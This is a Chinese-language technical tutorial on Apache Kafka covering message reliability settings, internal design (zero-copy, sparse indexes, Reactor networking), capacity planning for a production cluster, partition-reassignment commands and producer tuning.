<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">SendResult&lt;String, Object&gt; sendResult = kafkaTemplate.send(topic, o).get();</span><br><span class="line"><span class="keyword">if</span> (sendResult.getRecordMetadata() != <span class="literal">null</span>) &#123;</span><br><span class="line">  logger.info(<span class="string">&quot;生产者成功发送消息到&quot;</span> + sendResult.getProducerRecord().topic() + <span class="string">&quot;-&gt; &quot;</span> + sendRe</span><br><span class="line">              sult.getProducerRecord().value().toString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是一般不推荐这么做！可以采用为其添加回调函数的形式，示例代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ListenableFuture&lt;SendResult&lt;String, Object&gt;&gt; future = kafkaTemplate.send(topic, o);</span><br><span class="line">future.addCallback(result -&gt; logger.info(<span class="string">&quot;生产者成功发送消息到topic:&#123;&#125; partition:&#123;&#125;的消息&quot;</span>, result.getRecordMetadata().topic(), result.getRecordMetadata().partition()),</span><br><span class="line">        ex -&gt; logger.error(<span class="string">&quot;生产者发送消失败，原因：&#123;&#125;&quot;</span>, ex.getMessage()));</span><br></pre></td></tr></table></figure>

<p>如果消息发送失败的话，检查失败的原因之后重新发送即可！</p>
<p><strong>另外这里推荐为 Producer 的<code>retries</code>（重试次数）设置一个比较合理的值，一般是 3 ，但是为了保证消息不丢失的话一般会设置比较大一点。设置完成之后，当出现网络问题之后能够自动重试消息发送，避免消息丢失。另外，建议还要设置重试间隔，因为间隔太小的话重试的效果就不明显了，网络波动一次你3次一下子就重试完了</strong></p>
<h3 id="消费者丢失消息的情况"><a href="#消费者丢失消息的情况" class="headerlink" title="消费者丢失消息的情况"></a>消费者丢失消息的情况</h3><p>消息在被追加到分区（Partition）的时候都会分配一个特定的偏移量（offset）。偏移量（offset）表示 Consumer 当前消费到的分区（Partition）的所在的位置。Kafka 通过偏移量（offset）可以保证消息在分区内的顺序性。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203012058652.jpg" alt="kafka offset"></p>
<p>当消费者拉取到了分区的某个消息之后，消费者会自动提交了 offset。自动提交的话会有一个问题，试想一下，当消费者刚拿到这个消息准备进行真正消费的时候，突然挂掉了，消息实际上并没有被消费，但是 offset 却被自动提交了。</p>
<p><strong>可以手动关闭自动提交 offset，每次在真正消费完消息之后再手动提交 offset 。</strong> 但是，这样会带来消息被重新消费的问题。比如你刚刚消费完消息之后，还没提交 offset，结果自己挂掉了，那么这个消息理论上就会被消费两次。</p>
<h3 id="Kafka-弄丢了消息"><a href="#Kafka-弄丢了消息" class="headerlink" title="Kafka 弄丢了消息"></a>Kafka 弄丢了消息</h3><p><strong>试想一种情况：假如 leader 副本所在的 broker 突然挂掉，那么就要从 follower 副本重新选出一个 leader ，但是 leader 的数据还有一些没有被 follower 副本的同步的话，就会造成消息丢失。</strong></p>
<p>解决办法就是设置  <strong>acks &#x3D; all</strong>。</p>
<p>acks 的默认值即为1，代表消息被leader副本接收之后就算被成功发送。当配置 <strong>acks &#x3D; all</strong> 代表则所有副本都要接收到该消息之后该消息才算真正成功被发送。</p>
<p><strong>设置 replication.factor &gt;&#x3D; 3</strong></p>
<p>为了保证 leader 副本能有 follower 副本能同步消息，一般会为 topic 设置 <strong>replication.factor &gt;&#x3D; 3</strong>。这样就可以保证每个分区（partition）至少有 3 个副本。虽然造成了数据冗余，但是带来了数据的安全性。</p>
<p><strong>设置 min.insync.replicas &gt; 1</strong></p>
<p>一般情况下还需要设置 <strong>min.insync.replicas&gt; 1</strong> ，这样配置代表消息至少要被写入到 2 个副本才算是被成功发送。<strong>min.insync.replicas</strong> 的默认值为 1 ，在实际生产中应尽量避免默认值 1。</p>
<p>但是，为了保证整个 Kafka 服务的高可用性，你需要确保 <strong>replication.factor &gt; min.insync.replicas</strong> 。为什么呢？设想一下假如两者相等的话，只要是有一个副本挂掉，整个分区就无法正常工作了。这明显违反高可用性！一般推荐设置成 <strong>replication.factor &#x3D; min.insync.replicas + 1</strong>。</p>
<p><strong>设置 unclean.leader.election.enable &#x3D; false</strong></p>
<blockquote>
<p><strong>Kafka 0.11.0.0版本开始 unclean.leader.election.enable 参数的默认值由原来的true 改为false</strong></p>
</blockquote>
<p>配置了 <strong>unclean.leader.election.enable &#x3D; false</strong>  的话，当 leader 副本发生故障时就不会从  follower 副本中和 leader 同步程度达不到要求的副本中选择出  leader ，这样降低了消息丢失的可能性。</p>
<h2 id="Kafka-如何保证消息不重复消费"><a href="#Kafka-如何保证消息不重复消费" class="headerlink" title="Kafka 如何保证消息不重复消费"></a>Kafka 如何保证消息不重复消费</h2><p><strong>kafka出现消息重复消费的原因：</strong></p>
<ul>
<li>服务端侧已经消费的数据没有成功提交 offset（根本原因）。</li>
<li>Kafka 侧由于服务端处理业务时间长或者网络链接等等原因让 Kafka 认为服务假死，触发了分区 rebalance。</li>
</ul>
<p><strong>解决方案：</strong></p>
<ul>
<li><p>消费消息服务做幂等校验，比如 Redis 的set、MySQL 的主键等天然的幂等功能。这种方法最有效。</p>
</li>
<li><p>将 <code>enable.auto.commit</code>参数设置为 false，关闭自动提交，开发者在代码中手动提交 offset。那么这里会有个问题：</p>
<p>什么时候提交offset合适？</p>
<ul>
<li>处理完消息再提交：依旧有消息重复消费的风险，和自动提交一样。</li>
<li>拉取到消息即提交：会有消息丢失的风险。允许消息延时的场景，一般会采用这种方式。然后，通过定时任务在业务不繁忙（比如凌晨）的时候做数据兜底。</li>
</ul>
</li>
</ul>
<h2 id="为什么会有消息系统"><a href="#为什么会有消息系统" class="headerlink" title="为什么会有消息系统"></a>为什么会有消息系统</h2><ul>
<li><p>解耦合</p>
</li>
<li><p>异步处理 例如电商平台，秒杀活动。一般流程会分为：1: <code>风险控制</code>、2：<code>库存锁定</code>、3：<code>生成订单</code>、4：<code>短信通知</code>、5：<code>更新数据</code></p>
</li>
<li><p>通过消息系统将秒杀活动业务拆分开，将不急需处理的业务放在后面慢慢处理；流程改为：1：<code>风险控制</code>、2：<code>库存锁定</code>、3:<code>消息系统</code>、4:<code>生成订单</code>、5：<code>短信通知</code>、6：<code>更新数据</code></p>
</li>
<li><p>流量的控制 ：1. 网关在接受到请求后，就把请求放入到消息队列里面 2. 后端的服务从消息队列里面获取到请求，完成后续的秒杀处理流程。然后再给用户返回结果。优点：控制了流量 缺点：会让流程变慢</p>
</li>
</ul>
<h2 id="Kafka核心概念"><a href="#Kafka核心概念" class="headerlink" title="Kafka核心概念"></a>Kafka核心概念</h2><p><strong>生产者</strong>：Producer 往Kafka集群生成数据</p>
<p><strong>消费者</strong>：Consumer 往Kafka里面去获取数据，处理数据、消费数据Kafka的数据是由消费者自己去拉去Kafka里面的数据</p>
<p><strong>主题</strong>：topic</p>
<p><strong>分区</strong>：partition 默认一个topic有一个分区（partition），自己可设置多个分区（分区分散存储在服务器不同节点上）</p>
<h2 id="Kafka的集群架构"><a href="#Kafka的集群架构" class="headerlink" title="Kafka的集群架构"></a>Kafka的集群架构</h2><p>Kafka集群中，一个kafka服务器就是一个broker，Topic只是逻辑上的概念，partition在磁盘上就体现为一个目录。</p>
<p><strong>Consumer Group</strong>：消费组 消费数据的时候，都必须指定一个group id，指定一个组的id假定程序A和程序B指定的group id号一样，那么两个程序就属于同一个消费组。</p>
<p><strong>特殊</strong>: 比如，有一个主题topicA程序A去消费了这个topicA，那么程序B就不能再去消费topicA（程序A和程序B属于一个消费组）；再比如程序A已经消费了topicA里面的数据，现在还是重新再次消费topicA的数据，是不可以的，但是重新指定一个group id号以后，可以消费。不同消费组之间没有影响，消费组需自定义，消费者名称程序自动生成（独一无二）。</p>
<p><strong>Controller</strong>：Kafka节点里面的一个主节点，借助zookeeper。</p>
<h2 id="Kafka磁盘顺序写保证写数据性能"><a href="#Kafka磁盘顺序写保证写数据性能" class="headerlink" title="Kafka磁盘顺序写保证写数据性能"></a>Kafka磁盘顺序写保证写数据性能</h2><p>kafka写数据：顺序写，往磁盘上写数据时，就是追加数据，没有随机写的操作。经验：如果一个服务器磁盘达到一定的个数，磁盘也达到一定转数，往磁盘里面顺序写（追加写）数据的速度和写内存的速度差不多，生产者生产消息，经过kafka服务先写到os cache 内存中，然后经过sync顺序写到磁盘上。</p>
<h2 id="Kafka零拷贝机制保证读数据高性能"><a href="#Kafka零拷贝机制保证读数据高性能" class="headerlink" title="Kafka零拷贝机制保证读数据高性能"></a>Kafka零拷贝机制保证读数据高性能</h2><p>消费者读取数据一般流程：</p>
<ol>
<li><p>消费者发送请求给kafka服务</p>
</li>
<li><p>kafka服务去os cache缓存读取数据（缓存没有就去磁盘读取数据）</p>
</li>
<li><p>从磁盘读取了数据到os cache缓存中</p>
</li>
<li><p>os cache复制数据到kafka应用程序中</p>
</li>
<li><p>kafka将数据（复制）发送到socket cache中</p>
</li>
<li><p>socket cache通过网卡传输给消费者</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/906580bd62dc4b418491e47713fdefca~tplv-k3u1fbpfcp-watermark.awebp" alt="图片"></p>
</li>
</ol>
<p>kafka linux sendfile技术 — 零拷贝</p>
<p>1.消费者发送请求给kafka服务 </p>
<p>2.kafka服务去os cache缓存读取数据（缓存没有就去磁盘读取数据） </p>
<p>3.从磁盘读取了数据到os cache缓存中 </p>
<p>4.os cache直接将数据发送给网卡 </p>
<p>5.通过网卡将数据传输给消费者</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2a25f9d4e0fa443986a7c5266f818b98~tplv-k3u1fbpfcp-watermark.awebp" alt="图片"></p>
<h2 id="Kafka日志分段保存"><a href="#Kafka日志分段保存" class="headerlink" title="Kafka日志分段保存"></a>Kafka日志分段保存</h2><p>Kafka中一个主题，一般会设置分区；比如创建了一个<code>topic_a</code>，然后创建的时候指定了这个主题有三个分区。其实在三台服务器上，会创建三个目录。服务器1（kafka1）创建目录topic_a-0:。目录下面是我们文件（存储数据），kafka数据就是message，数据存储在log文件里。.log结尾的就是日志文件，在kafka中把数据文件就叫做日志文件 。<strong>一个分区下面默认有n多个日志文件（分段存储），一个日志文件默认1G</strong>。</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/1e8fe0fa08d542e68b560c276c66cab1~tplv-k3u1fbpfcp-watermark.awebp" alt="图片"></p>
<p>服务器2（kafka2）：创建目录topic_a-1: </p>
<p>服务器3（kafka3）：创建目录topic_a-2:</p>
<h2 id="Kafka二分查找定位数据"><a href="#Kafka二分查找定位数据" class="headerlink" title="Kafka二分查找定位数据"></a>Kafka二分查找定位数据</h2><p>Kafka里面每一条消息，都有自己的offset（相对偏移量），存在物理磁盘上面，在position Position：物理位置（磁盘上面哪个地方）也就是说一条消息就有两个位置：</p>
<p>offset：相对偏移量（相对位置）</p>
<p>position：磁盘物理位置</p>
<p><strong>稀疏索引：</strong>     Kafka中采用了稀疏索引的方式读取索引，kafka每当写入了4k大小的日志（.log），就往index里写入一个记录索引。其中会采用二分查找。</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/819ccf7b22644993bf934414e4feccf4~tplv-k3u1fbpfcp-watermark.awebp" alt="图片"></p>
<h2 id="高并发网络设计（先了解NIO）"><a href="#高并发网络设计（先了解NIO）" class="headerlink" title="高并发网络设计（先了解NIO）"></a>高并发网络设计（先了解NIO）</h2><p>网络设计部分是kafka中设计最好的一个部分，这也是保证Kafka高并发、高性能的原因，对kafka进行调优，就得对kafka原理比较了解，尤其是网络设计部分</p>
<p><strong>Reactor网络设计模式1：</strong></p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/8d1ef2e7534744a68c89cff330f1896f~tplv-k3u1fbpfcp-watermark.awebp" alt="图片"></p>
<p><strong>Reactor网络设计模式2：</strong></p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/740f7f42db034e8d99ab339995e37636~tplv-k3u1fbpfcp-watermark.awebp" alt="图片"></p>
<p><strong>Reactor网络设计模式3：</strong></p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/788ac1f8fbef4bc78c0b8386c5c1f256~tplv-k3u1fbpfcp-watermark.awebp" alt="图片"></p>
<p><strong>Kafka超高并发网络设计：</strong></p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/a729e19b67a24b6f88688c35710edda0~tplv-k3u1fbpfcp-watermark.awebp" alt="图片"></p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/d23045256a224c818f95e9601cadefa9~tplv-k3u1fbpfcp-watermark.awebp" alt="图片"></p>
<h2 id="Kafka冗余副本保证高可用"><a href="#Kafka冗余副本保证高可用" class="headerlink" title="Kafka冗余副本保证高可用"></a>Kafka冗余副本保证高可用</h2><p>在kafka里面分区是有副本的，注：<strong>0.8以前是没有副本机制的</strong>。创建主题时，可以指定分区，也可以指定副本个数。副本是有角色的：leader partition：1、写数据、读数据操作都是从leader partition去操作的。2、会维护一个ISR（in-sync- replica ）列表，但是会根据一定的规则删除ISR列表里面的值。生产者发送来一个消息，消息首先要写入到leader partition中，写完了以后，还要把消息写入到ISR列表里面的其它分区，写完后才算这个消息提交。 follower partition：从leader partition同步数据。</p>
<h2 id="优秀架构思考-总结"><a href="#优秀架构思考-总结" class="headerlink" title="优秀架构思考-总结"></a>优秀架构思考-总结</h2><p>Kafka — 高并发、高可用、高性能 高可用：多副本机制 高并发：网络架构设计 三层架构：多selector -&gt; 多线程 -&gt; 队列的设计（NIO） 高性能：</p>
<p>写数据：</p>
<ol>
<li>把数据先写入到OS Cache</li>
<li>写到磁盘上面是顺序写，性能很高</li>
</ol>
<p>读数据：</p>
<ol>
<li>根据稀疏索引，快速定位到要消费的数据</li>
<li>零拷贝机制，减少数据的拷贝，减少了应用程序与操作系统上下文切换</li>
</ol>
<h2 id="Kafka生产环境搭建"><a href="#Kafka生产环境搭建" class="headerlink" title="Kafka生产环境搭建"></a>Kafka生产环境搭建</h2><h3 id="需求场景分析"><a href="#需求场景分析" class="headerlink" title="需求场景分析"></a>需求场景分析</h3><blockquote>
<p>电商平台，需要每天10亿请求都要发送到Kafka集群上面。二八效应，一般评估出来问题都不大。10亿请求 -&gt; 24 过来的，一般情况下，每天的12:00 到早上8:00 这段时间其实是没有多大的数据量的。80%的请求是用的另外16小时的处理的。16个小时处理 -&gt; 8亿的请求。16 * 0.2 &#x3D; 3个小时 处理了8亿请求的80%的数据</p>
</blockquote>
<p>也就是说6亿的数据是靠3个小时处理完的。简单的算一下高峰期时候的qps<code>6亿/3小时 =5.5万/s qps=5.5万</code></p>
<blockquote>
<p>10亿请求 * 50kb &#x3D; 46T 每天需要存储46T的数据</p>
</blockquote>
<p>一般情况下，都会设置两个副本 <strong>46T * 2 &#x3D; 92T</strong> Kafka里面的数据是有保留的时间周期，保留最近<strong>3</strong>天的数据。<strong>92T * 3天 &#x3D; 276T</strong>我这儿说的是50kb不是说一条消息就是50kb，（把日志合并了，多条日志合并在一起），通常情况下，一条消息就几b，也有可能就是几百字节。</p>
<h3 id="物理机数量评估"><a href="#物理机数量评估" class="headerlink" title="物理机数量评估"></a>物理机数量评估</h3><p>1）首先分析一下是需要虚拟机还是物理机 像Kafka mysql hadoop这些集群搭建的时候，我们生产里面都是使用物理机。</p>
<p>2）高峰期需要处理的请求总的请求每秒5.5万个，其实一两台物理机绝对是可以抗住的。一般情况下，评估机器的时候，是按照高峰期的4倍的去评估。如果是4倍的话，大概我们集群的能力要准备到 20万qps。这样子的集群才是比较安全的集群。大概就需要5台物理机。每台承受4万请求。</p>
<p><strong>场景总结：</strong><code>搞定10亿请求，高峰期5.5万的qps,276T的数据，需要5台物理机。</code></p>
<h3 id="磁盘选择"><a href="#磁盘选择" class="headerlink" title="磁盘选择"></a>磁盘选择</h3><p>搞定10亿请求，高峰期5.5万的qps，276T的数据，需要5台物理机。</p>
<p>1）SSD固态硬盘，还是需要普通的机械硬盘</p>
<p>SSD硬盘：性能比较好，但是价格贵 </p>
<p>SAS盘：某方面性能不是很好，但是比较便宜。SSD硬盘性能比较好，指的是它随机读写的性能比较好。适合MySQL这样集群。但是其实他的顺序写的性能跟SAS盘差不多。kafka就是用的顺序写。所以我们就用普通的机械硬盘就可以了。</p>
<p>2）需要评估每台服务器需要多少块磁盘 </p>
<p>5台服务器，一共需要276T ，大约每台服务器需要存储60T的数据。</p>
<p>公司里面服务器的配置用的是11块硬盘，每个硬盘 7T。11 * 7T &#x3D; 77T</p>
<blockquote>
<p>77T * 5 台服务器 &#x3D; 385T。</p>
</blockquote>
<p><strong>场景总结：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">搞定10亿请求，需要5台物理机，11（SAS） * 7T</span><br></pre></td></tr></table></figure>

<h3 id="内存评估"><a href="#内存评估" class="headerlink" title="内存评估"></a>内存评估</h3><p>搞定10亿请求，需要5台物理机，11（SAS） * 7T</p>
<p>kafka读写数据的流程都是基于os cache，换句话说假设咱们的os cashe无限大那么整个kafka是不是相当于就是基于内存去操作，如果是基于内存去操作，性能肯定很好。内存是有限的。</p>
<p>1） 尽可能多的内存资源要给 os cache </p>
<p>2） Kafka核心的代码用的是scala写的，客户端的代码java写的。都是基于jvm。所以还要给一部分的内存给jvm。Kafka的设计，没有把很多数据结构都放在jvm里面。所以这个jvm不需要太大的内存。<strong>根据经验，给个10G就可以了</strong>。</p>
<blockquote>
<p>NameNode：jvm里面还放了元数据（几十G），JVM一定要给得很大。比如给个100G。</p>
</blockquote>
<p>假设这个10请求的这个项目，一共会有100个topic。100 topic * 5 partition * 2 &#x3D; 1000 partition 一个partition其实就是物理机上面的一个目录，这个目录下面会有很多个.log的文件。.log就是存储数据文件，默认情况下一个.log文件的大小是1G。如果要保证 1000个partition 的最新的.log 文件的数据如果都在内存里面，这个时候性能就是最好。1000 * 1G &#x3D; 1000G内存。 我们只需要把当前最新的这个log 保证里面的25%的最新的数据在内存里面。250M * 1000 &#x3D; 0.25 G* 1000 &#x3D;250G的内存。</p>
<p>250内存 &#x2F; 5 &#x3D; 50G内存 50G+10G &#x3D; 60G内存</p>
<p>64G的内存，另外的4G，操作系统本生是不是也需要内存。其实Kafka的jvm也可以不用给到10G这么多。评估出来64G是可以的。当然如果能给到128G的内存的服务器，那就最好。</p>
<p>我刚刚评估的时候用的都是一个topic是5个partition，但是如果是数据量比较大的topic，可能会有10个partition。</p>
<p>总结：搞定10亿请求，需要5台物理机，11（SAS） * 7T ，需要64G的内存（128G更好）</p>
<h3 id="CPU压力评估"><a href="#CPU压力评估" class="headerlink" title="CPU压力评估"></a>CPU压力评估</h3><p>评估一下每台服务器需要多少cpu core（资源很有限）</p>
<p>评估需要多少个cpu ，依据就是看服务里面有多少线程去跑。线程就是依托cpu去运行的。如果线程比较多，但是cpu core比较少，这样的话，机器负载就会很高，性能就不好。</p>
<p>评估一下，kafka的一台服务器启动以后会有多少线程？</p>
<p>Acceptor线程 1 processor线程 3 6~9个线程 处理请求线程 8个 32个线程 定时清理的线程，拉取数据的线程，定时检查ISR列表的机制 等等。所以大概一个Kafka的服务启动起来以后，会有一百多个线程。</p>
<p>cpu core &#x3D; 4个，一遍来说，几十个线程，就肯定把cpu 打满了。cpu core &#x3D; 8个，应该很轻松的能支持几十个线程。如果线程是100多个，或者差不多200个，那么8 个 cpu core是搞不定的。所以这儿建议：CPU core &#x3D; 16个。如果可以的话，能有32个cpu core 那就最好。</p>
<p>结论：kafka集群，最低也要给16个cpu core，如果能给到32 cpu core那就更好。2cpu * 8 &#x3D;16 cpu core 4cpu * 8 &#x3D; 32 cpu core</p>
<p>总结：搞定10亿请求，需要5台物理机，11（SAS） * 7T ，需要64G的内存（128G更好），需要16个cpu core（32个更好）</p>
<h3 id="网络需求评估"><a href="#网络需求评估" class="headerlink" title="网络需求评估"></a>网络需求评估</h3><p>评估需要什么样网卡？<strong>一般要么是千兆的网卡（1G&#x2F;s），还有的就是万兆的网卡（10G&#x2F;s）</strong></p>
<p>高峰期的时候 每秒会有5.5万的请求涌入，5.5&#x2F;5 &#x3D; 大约是每台服务器会有1万个请求涌入。<br>我们之前说的，<br>10000 * 50kb &#x3D; 488M  也就是每条服务器，每秒要接受488M的数据。数据还要有副本，副本之间的同步<br>也是走的网络的请求。488 * 2 &#x3D; 976m&#x2F;s<br>说明一下：<br>  很多公司的数据，一个请求里面是没有50kb这么大的，我们公司是因为主机在生产端封装了数据<br>  然后把多条数据合并在一起了，所以我们的一个请求才会有这么大。</p>
<p>说明一下：<br>   一般情况下，网卡的带宽是达不到极限的，如果是千兆的网卡，我们能用的一般就是700M左右。<br>   但是如果最好的情况，我们还是使用万兆的网卡。<br>   如果使用的是万兆的，那就是很轻松。</p>
<h3 id="集群规划"><a href="#集群规划" class="headerlink" title="集群规划"></a>集群规划</h3><p>请求量 规划物理机的个数 分析磁盘的个数，选择使用什么样的磁盘 内存 cpu core 网卡就是告诉大家，以后要是公司里面有什么需求，进行资源的评估，服务器的评估，大家按照我的思路去评估</p>
<p><strong>一条消息的大小 50kb -&gt; 1kb 500byte 1M</strong>ip 主机名 192.168.0.100 hadoop1 192.168.0.101 hadoop2 192.168.0.102 hadoop3</p>
<p>主机的规划：kafka集群架构的时候：主从式的架构：controller -&gt; 通过zk集群来管理整个集群的元数据。</p>
<ol>
<li>zookeeper集群 hadoop1 hadoop2 hadoop3</li>
<li>kafka集群 理论上来讲，我们不应该把kafka的服务于zk的服务安装在一起。但是我们这儿服务器有限。所以我们kafka集群也是安装在hadoop1 haadoop2 hadoop3</li>
</ol>
<h2 id="kafka运维"><a href="#kafka运维" class="headerlink" title="kafka运维"></a>kafka运维</h2><h3 id="常见运维工具介绍"><a href="#常见运维工具介绍" class="headerlink" title="常见运维工具介绍"></a>常见运维工具介绍</h3><p>KafkaManager — 页面管理工具</p>
<h3 id="常见运维命令"><a href="#常见运维命令" class="headerlink" title="常见运维命令"></a>常见运维命令</h3><h4 id="场景一：topic数据量太大，要增加topic数"><a href="#场景一：topic数据量太大，要增加topic数" class="headerlink" title="场景一：topic数据量太大，要增加topic数"></a>场景一：<strong>topic数据量太大，要增加topic数</strong></h4><p>一开始创建主题的时候，数据量不大，给的分区数不多。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kafka-topics.sh --create --zookeeper hadoop1:2181,hadoop2:2181,hadoop3:2181 --replication-factor 1 --partitions 1 --topic test6</span><br><span class="line">kafka-topics.sh --alter --zookeeper hadoop1:2181,hadoop2:2181,ha</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>broker id：</p>
<p>hadoop1:0 hadoop2:1 hadoop3:2 假设一个partition有三个副本：partition0：a,b,c</p>
<p>a：leader partition b，c:follower partition</p>
<p>ISR:{a,b,c}<code>如果一个follower分区 超过10秒 没有向leader partition去拉取数据，那么这个分区就从ISR列表里面移除。</code></p>
<h4 id="场景二：核心topic增加副本因子"><a href="#场景二：核心topic增加副本因子" class="headerlink" title="场景二：核心topic增加副本因子"></a>场景二：<strong>核心topic增加副本因子</strong></h4><p>如果对核心业务数据需要增加副本因子 vim test.json脚本，将下面一行json脚本保存</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;“version”:1,“partitions”:[&#123;“topic”:“test6”,“partition”:0,“replicas”:[0,1,2]&#125;,&#123;“topic”:“test6”,“partition”:1,“replicas”:[0,1,2]&#125;,&#123;“topic”:“test6”,“partition”:2,“replicas”:[0,1,2]&#125;]&#125;</span><br><span class="line"></span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p><strong>执行上面json脚本：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kafka-reassign-partitions.sh --zookeeper hadoop1:2181,hadoop2:2181,hadoop3:2181 --reassignment-json-file test.json --execute</span><br><span class="line"></span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<h4 id="场景三：负载不均衡的topic，手动迁移vi-topics-to-move-json"><a href="#场景三：负载不均衡的topic，手动迁移vi-topics-to-move-json" class="headerlink" title="场景三：负载不均衡的topic，手动迁移vi topics-to-move.json"></a>场景三：<strong>负载不均衡的topic，手动迁移</strong>vi topics-to-move.json</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;“topics”: [&#123;“topic”: “test01”&#125;, &#123;“topic”: “test02”&#125;], “version”: 1&#125; // 把你所有的topic都写在这里</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kafka-reassgin-partitions.sh --zookeeper hadoop1:2181,hadoop2:2181,hadoop3:2181 --topics-to-move-json-file topics-to-move.json --broker-list “5,6” --generate</span><br><span class="line"></span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p>把你所有的包括新加入的broker机器都写在这里，就会说是把所有的partition均匀的分散在各个broker上，包括新进来的broker此时会生成一个迁移方案，可以保存到一个文件里去：expand-cluster-reassignment.json</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kafka-reassign-partitions.sh --zookeeper hadoop01:2181,hadoop02:2181,hadoop03:2181 --reassignment-json-file expand-cluster-reassignment.json --execute</span><br><span class="line"></span><br><span class="line">kafka-reassign-partitions.sh --zookeeper hadoop01:2181,hadoop02:2181,hadoop03:2181 --reassignment-json-file expand-cluster-reassignment.json --verify</span><br><span class="line"></span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p>这种数据迁移操作一定要在晚上低峰的时候来做，因为他会在机器之间迁移数据，非常的占用带宽资源<code>–generate:</code> 根据给予的Topic列表和Broker列表生成迁移计划。generate并不会真正进行消息迁移，而是将消息迁移计划计算出来，供execute命令使用。–execute: 根据给予的消息迁移计划进行迁移。–verify: 检查消息是否已经迁移完成。</p>
<h4 id="场景四：如果某个broker-leader-partition过多"><a href="#场景四：如果某个broker-leader-partition过多" class="headerlink" title="场景四：如果某个broker leader partition过多"></a>场景四：<strong>如果某个broker leader partition过多</strong></h4><p>正常情况下，我们的leader partition在服务器之间是负载均衡。hadoop1 4 hadoop2 1 hadoop3 1</p>
<p>现在各个业务方可以自行申请创建 topic，分区数量都是自动分配和后续动态调整的， kafka本身会自动把leader partition均匀分散在各个机器上，这样可以保证每台机器的读写吞吐量都是均匀的 但是也有例外，那就是如果某些broker宕机，会导致 leader partition 过于集中在其他少部分几台broker上， 这会导致少数几台broker的读写请求压力过高，其他宕机的 broker 重启之后都是folloer partition，读写请求很低，造成集群负载不均衡有一个参数，auto.leader.rebalance.enable，默认是true， 每隔300秒（leader.imbalance.check.interval.seconds）检查leader负载是否平衡 如果一台broker上的不均衡的leader超过了10%，leader.imbalance.per.broker.percentage， 就会对这个broker进行选举 配置参数：auto.leader.rebalance.enable 默认是true leader.imbalance.per.broker.percentage: 每个broker允许的不平衡的leader的比率。如果每个broker超过了这个值，控制器会触发leader的平衡。这个值表示百分比。10% leader.imbalance.check.interval.seconds：默认值300秒</p>
<h2 id="Kafka生产者"><a href="#Kafka生产者" class="headerlink" title="Kafka生产者"></a>Kafka生产者</h2><h3 id="生产者发送消息原理"><a href="#生产者发送消息原理" class="headerlink" title="生产者发送消息原理"></a>生产者发送消息原理</h3><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/37f947d9da28495fac11a0561168dfc3~tplv-k3u1fbpfcp-watermark.awebp" alt="图片"></p>
<h3 id="生产者发送消息原理—基础案例演示"><a href="#生产者发送消息原理—基础案例演示" class="headerlink" title="生产者发送消息原理—基础案例演示"></a>生产者发送消息原理—基础案例演示</h3><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/1a581ad65990450ba37c5fe7fae0ccfd~tplv-k3u1fbpfcp-watermark.awebp" alt="图片"></p>
<h3 id="如何提升吞吐量"><a href="#如何提升吞吐量" class="headerlink" title="如何提升吞吐量"></a>如何提升吞吐量</h3><p>如何提升吞吐量：参数一：<code>buffer.memory</code>：设置发送消息的缓冲区，默认值是33554432，就是32MB 参数二：<code>compression.type</code>：默认是none，不压缩，但是也可以使用lz4压缩，效率还是不错的，压缩之后可以减小数据量，提升吞吐量，但是会加大producer端的cpu开销 参数三：<code>batch.size</code>：设置batch的大小，如果batch太小，会导致频繁网络请求，吞吐量下降；如果batch太大，会导致一条消息需要等待很久才能被发送出去，而且会让内存缓冲区有很大压力，过多数据缓冲在内存里，默认值是：16384，就是16kb，也就是一个batch满了16kb就发送出去，一般在实际生产环境，这个batch的值可以增大一些来提升吞吐量，如果一个批次设置大了，会有延迟。一般根据一条消息大小来设置。如果我们消息比较少。配合使用的参数linger.ms，这个值默认是0，意思就是消息必须立即被发送，但是这是不对的，一般设置一个100毫秒之类的，这样的话就是说，这个消息被发送出去后进入一个batch，如果100毫秒内，这个batch满了16kb，自然就会发送出去。</p>
<h3 id="如何处理异常"><a href="#如何处理异常" class="headerlink" title="如何处理异常"></a>如何处理异常</h3><ol>
<li>LeaderNotAvailableException：这个就是如果某台机器挂了，此时leader副本不可用，会导致你写入失败，要等待其他follower副本切换为leader副本之后，才能继续写入，此时可以重试发送即可；如果说你平时重启kafka的broker进程，肯定会导致leader切换，一定会导致你写入报错，是LeaderNotAvailableException。</li>
<li>NotControllerException：这个也是同理，如果说Controller所在Broker挂了，那么此时会有问题，需要等待Controller重新选举，此时也是一样就是重试即可。</li>
<li>NetworkException：网络异常 timeout a. 配置retries参数，他会自动重试的 b. 但是如果重试几次之后还是不行，就会提供Exception给我们来处理了,我们获取到异常以后，再对这个消息进行单独处理。我们会有备用的链路。发送不成功的消息发送到Redis或者写到文件系统中，甚至是丢弃。</li>
</ol>
